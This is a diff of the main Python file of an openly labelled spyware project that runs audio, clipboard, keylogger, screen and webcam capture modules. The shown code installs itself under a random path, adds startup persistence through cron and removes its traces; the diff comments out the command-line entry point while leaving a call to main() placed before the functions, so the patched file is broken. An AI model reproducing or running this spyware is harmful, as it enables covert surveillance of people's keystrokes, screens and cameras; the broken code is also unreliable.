@@ -1,28 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
 ###################
 #    This file implements a complete spyware.
 #    Copyright (C) 2021, 2022, 2023  Maurice Lambert
-
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
 #    the Free Software Foundation, either version 3 of the License, or
 #    (at your option) any later version.
-
 #    This program is distributed in the hope that it will be useful,
 #    but WITHOUT ANY WARRANTY; without even the implied warranty of
 #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 #    GNU General Public License for more details.
-
 #    You should have received a copy of the GNU General Public License
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###################
-
 """
 This file implements a complete spyware.
 """
-
 __version__ = "1.0.4"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
@@ -33,7 +27,6 @@ This file implements a complete spyware.
 """
 license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/SpyWare"
-
 copyright = """
 SpyWare  Copyright (C) 2021, 2022, 2023  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
@@ -42,9 +35,7 @@ under certain conditions.
 """
 __license__ = license
 __copyright__ = copyright
-
 __all__ = ["spy", "join", "stop_deamons", "main", "modules"]
-
 try:
     from ClipboardLogger.ClipboardLogger import (
         Daemon as ClipboardDaemon,
@@ -117,7 +108,6 @@ except ImportError:
         config_load as keyConfig,
         CONFIGURATIONS as key_config,
     )
-
 from os import (
     environ,
     scandir,
@@ -143,9 +133,7 @@ from platform import system
 from getpass import getuser
 from atexit import register
 from glob import glob
-
 system: str = system()
-
 modules: Dict[str, str] = {
     "audio": "audioSpy.conf",
     "clipboard": "clipboardSpy.conf",
@@ -155,7 +143,9 @@ modules: Dict[str, str] = {
     "screen": "screenSpy.conf",
     "webcam": "webcamSpy.conf",
 }
-
+if __name__ == "__main__":
+    print(copyright)
+    exit(main())
 
 def join_all(*threads: List[Thread]) -> None:
 
@@ -166,7 +156,6 @@ def join_all(*threads: List[Thread]) -> None:
     for thread in threads:
         thread.join()
 
-
 def stop_deamons(*daemons: List[Thread]) -> None:
 
     """
@@ -175,7 +164,6 @@ def stop_deamons(*daemons: List[Thread]) -> None:
 
     for daemon in daemons:
         daemon.run = False
-
 
 def spy(modules: Dict[str, str]) -> int:
 
@@ -222,116 +210,113 @@ def spy(modules: Dict[str, str]) -> int:
 
     return EXITCODE
 
+# def env(keyvalue: str) -> None:
+#
+#     """
+#     This function adds environment variables.
+#     """
+#
+#     if "=" not in keyvalue:
+#         raise ValueError(
+#             "Environment variable should contains a "
+#             "string key and a string value separate by '='."
+#         )
+#
+#     key, value = keyvalue.split("=", 1)
+#     environ[key] = value
 
-def env(keyvalue: str) -> None:
-
-    """
-    This function adds environment variables.
-    """
-
-    if "=" not in keyvalue:
-        raise ValueError(
-            "Environment variable should contains a "
-            "string key and a string value separate by '='."
-        )
-
-    key, value = keyvalue.split("=", 1)
-    environ[key] = value
-
-
-def parse_args() -> Namespace:
-
-    """
-    This function parses command line arguments.
-    """
-
-    arguments = ArgumentParser(
-        description="This file implements a complete spyware."
-    )
-
-    add_argument = arguments.add_argument
-
-    add_argument(
-        "--env",
-        "-e",
-        type=env,
-        action="extend",
-        nargs="*",
-        help=(
-            "Add environment variable, values "
-            "should be formatted as <key>=<value>"
-        ),
-    )
-    add_argument(
-        "--install",
-        "-i",
-        action="store_true",
-        help=(
-            "Install the spyware in APPDATA and enabled"
-            " it (launch on startup)"
-        ),
-    )
-    add_argument(
-        "--enable",
-        "-E",
-        action="store_true",
-        help="Enable the spyware (launch it on startup)",
-    )
-    add_argument(
-        "--remove",
-        "-r",
-        action="store_true",
-        help="Remove spyware trace (executable/script, links and data)",
-    )
-    add_argument(
-        "--tar",
-        "-t",
-        const="",
-        nargs="?",
-        choices={"gz", "xz", "bz2"},
-        help=(
-            "Build a tar file with data, optional value should"
-            " be 'gz', 'xz', 'bz2' to compress."
-        ),
-    )
-
-    modules_selection = arguments.add_subparsers(
-        dest="modules", help="Modules selection type.", required=False
-    )
-    add_parser = modules_selection.add_parser
-
-    runonly = add_parser("runonly", help="Run only specified modules.")
-    runonly_modules = runonly.add_argument_group(
-        "modules", "SpyWare modules to launch in this process."
-    )
-    runonly_add_argument = runonly_modules.add_argument
-
-    donotrun = add_parser("donotrun", help="Do not run specified modules.")
-    donotrun_modules = donotrun.add_argument_group(
-        "modules", "SpyWare modules to not launch in this process."
-    )
-    donotrun_add_argument = donotrun_modules.add_argument
-
-    for module, config in modules.items():
-        runonly_add_argument(
-            f"--{module}",
-            f"-{module[0]}",
-            nargs="?",
-            const=config,
-            help=(
-                f"Run module {module} with optional value "
-                f"as configuration file (default={config})."
-            ),
-        )
-        donotrun_add_argument(
-            f"--{module}",
-            f"-{module[0]}",
-            action="store_true",
-            help=f"Do not run module {module}.",
-        )
-
-    return arguments.parse_args()
-
+# def parse_args() -> Namespace:
+#
+#     """
+#     This function parses command line arguments.
+#     """
+#
+#     arguments = ArgumentParser(
+#         description="This file implements a complete spyware."
+#     )
+#
+#     add_argument = arguments.add_argument
+#
+#     add_argument(
+#         "--env",
+#         "-e",
+#         type=env,
+#         action="extend",
+#         nargs="*",
+#         help=(
+#             "Add environment variable, values "
+#             "should be formatted as <key>=<value>"
+#         ),
+#     )
+#     add_argument(
+#         "--install",
+#         "-i",
+#         action="store_true",
+#         help=(
+#             "Install the spyware in APPDATA and enabled"
+#             " it (launch on startup)"
+#         ),
+#     )
+#     add_argument(
+#         "--enable",
+#         "-E",
+#         action="store_true",
+#         help="Enable the spyware (launch it on startup)",
+#     )
+#     add_argument(
+#         "--remove",
+#         "-r",
+#         action="store_true",
+#         help="Remove spyware trace (executable/script, links and data)",
+#     )
+#     add_argument(
+#         "--tar",
+#         "-t",
+#         const="",
+#         nargs="?",
+#         choices={"gz", "xz", "bz2"},
+#         help=(
+#             "Build a tar file with data, optional value should"
+#             " be 'gz', 'xz', 'bz2' to compress."
+#         ),
+#     )
+#
+#     modules_selection = arguments.add_subparsers(
+#         dest="modules", help="Modules selection type.", required=False
+#     )
+#     add_parser = modules_selection.add_parser
+#
+#     runonly = add_parser("runonly", help="Run only specified modules.")
+#     runonly_modules = runonly.add_argument_group(
+#         "modules", "SpyWare modules to launch in this process."
+#     )
+#     runonly_add_argument = runonly_modules.add_argument
+#
+#     donotrun = add_parser("donotrun", help="Do not run specified modules.")
+#     donotrun_modules = donotrun.add_argument_group(
+#         "modules", "SpyWare modules to not launch in this process."
+#     )
+#     donotrun_add_argument = donotrun_modules.add_argument
+#
+#     for module, config in modules.items():
+#         runonly_add_argument(
+#             f"--{module}",
+#             f"-{module[0]}",
+#             nargs="?",
+#             const=config,
+#             help=(
+#                 f"Run module {module} with optional value "
+#                 f"as configuration file (default={config})."
+#             ),
+#         )
+#         donotrun_add_argument(
+#             f"--{module}",
+#             f"-{module[0]}",
+#             action="store_true",
+#             help=f"Do not run module {module}.",
+#         )
+#
+#     return arguments.parse_args()
 
 def get_random_path() -> Tuple[str, str, str]:
 
@@ -380,7 +365,6 @@ def get_random_path() -> Tuple[str, str, str]:
 
     return path, dir_name, filename
 
-
 def install() -> None:
 
     """
@@ -414,7 +398,6 @@ def install() -> None:
     chdir(dir_name)
     argv[0] = path
     enabled(path)
-
 
 def enabled(path: str = argv[0]) -> None:
 
@@ -458,7 +441,6 @@ def enabled(path: str = argv[0]) -> None:
         with open(f"/var/spool/cron/{getuser()}") as file:
             print(f"\n@reboot {executable} {path}", file=file)
 
-
 def remove_trace(modules: Dict[str, str] = modules) -> None:
 
     """
@@ -492,35 +474,33 @@ def remove_trace(modules: Dict[str, str] = modules) -> None:
         if exists(config):
             remove(config)
 
-
-def archive(modules: Dict[str, str] = modules, mode: str = "") -> str:
-
-    """
-    This function archives data.
-    """
-
-    name = choices(ascii_letters + digits, k=choice(range(1, 15)))
-    filename = f"archive_{name}.tar" + f".{mode}" if mode else mode
-
-    namespace = globals().copy()
-    namespace.update(locals())
-
-    with tar_open(filename, f"w:{mode}") as file:
-
-        for module in modules:
-            dir_name = getattr(
-                namespace[f"{module}_config"], "save_dirname", None
-            )
-            filename = getattr(
-                namespace[f"{module}_config"], "save_filename", None
-            )
-
-            if dir_name and exists(dir_name):
-                for filename in listdir(dir_name):
-                    file.add(filename)
-            elif filename and exists(filename):
-                file.add(filename)
-
+# def archive(modules: Dict[str, str] = modules, mode: str = "") -> str:
+#
+#     """
+#     This function archives data.
+#     """
+#
+#     name = choices(ascii_letters + digits, k=choice(range(1, 15)))
+#     filename = f"archive_{name}.tar" + f".{mode}" if mode else mode
+#
+#     namespace = globals().copy()
+#     namespace.update(locals())
+#
+#     with tar_open(filename, f"w:{mode}") as file:
+#
+#         for module in modules:
+#             dir_name = getattr(
+#                 namespace[f"{module}_config"], "save_dirname", None
+#             )
+#             filename = getattr(
+#                 namespace[f"{module}_config"], "save_filename", None
+#             )
+#
+#             if dir_name and exists(dir_name):
+#                 for filename in listdir(dir_name):
+#                     file.add(filename)
+#             elif filename and exists(filename):
+#                 file.add(filename)
 
 def cleandict(dict_: dict, keys: List[Hashable]) -> dict:
 
@@ -533,72 +513,65 @@ def cleandict(dict_: dict, keys: List[Hashable]) -> dict:
             del dict_[key]
     return dict_
 
+# def get_modules(arguments: Namespace) -> Dict[str, str]:
+#
+#     """
+#     This function builds the modules dict from arguments.
+#     """
+#
+#     modules_config = arguments.__dict__.copy()
+#
+#     is_mode_donotrun = arguments.modules == "donotrun"
+#
+#     cleandict(
+#         modules_config, ["env", "enable", "remove", "modules", "install"]
+#     )
+#
+#     if is_mode_donotrun:
+#         modules_copy = modules.copy()
+#     else:
+#         active_modules = {}
+#
+#     for module, config in modules_config.items():
+#         if is_mode_donotrun:
+#             if config is not None:
+#                 del modules_copy[module]
+#         else:
+#             if config is not None:
+#                 active_modules[module] = config
+#
+#     return modules_copy if is_mode_donotrun else active_modules
 
-def get_modules(arguments: Namespace) -> Dict[str, str]:
-
-    """
-    This function builds the modules dict from arguments.
-    """
-
-    modules_config = arguments.__dict__.copy()
-
-    is_mode_donotrun = arguments.modules == "donotrun"
-
-    cleandict(
-        modules_config, ["env", "enable", "remove", "modules", "install"]
-    )
-
-    if is_mode_donotrun:
-        modules_copy = modules.copy()
-    else:
-        active_modules = {}
-
-    for module, config in modules_config.items():
-        if is_mode_donotrun:
-            if config is not None:
-                del modules_copy[module]
-        else:
-            if config is not None:
-                active_modules[module] = config
-
-    return modules_copy if is_mode_donotrun else active_modules
-
-
-def main() -> int:
-
-    """
-    This function launchs the SpyWare modules from the command line.
-    """
-
-    arguments = parse_args()
-
-    if arguments.install:
-        install()
-    elif arguments.enable:
-        enabled()
-
-    if arguments.modules is None:
-        active_modules = modules
-    else:
-        active_modules = get_modules(parse_args())
-
-    tar = arguments.tar
-    if arguments.remove:
-        register(remove_trace, active_modules)
-    elif tar is not None:
-        register(archive, active_modules, tar)
-
-    EXITCODE = spy(active_modules)
-
+# def main() -> int:
+#
+#     """
+#     This function launchs the SpyWare modules from the command line.
+#     """
+#
+#     arguments = parse_args()
+#
+#     if arguments.install:
+#         install()
+#     elif arguments.enable:
+#         enabled()
+#
+#     if arguments.modules is None:
+#         active_modules = modules
+#     else:
+#         active_modules = get_modules(parse_args())
+#
+#     tar = arguments.tar
+#     if arguments.remove:
+#         register(remove_trace, active_modules)
+#     elif tar is not None:
+#         register(archive, active_modules, tar)
+#
+#     EXITCODE = spy(active_modules)
+#
     # tar = arguments.tar
     # if arguments.remove:
     #     remove_trace(active_modules)
     # elif tar is not None:
     #     archive(active_modules, tar)
-
-    return EXITCODE
-
-
-if __name__ == "__main__":
-    print(copyright)
-    exit(main())
+#
+#     return EXITCODE
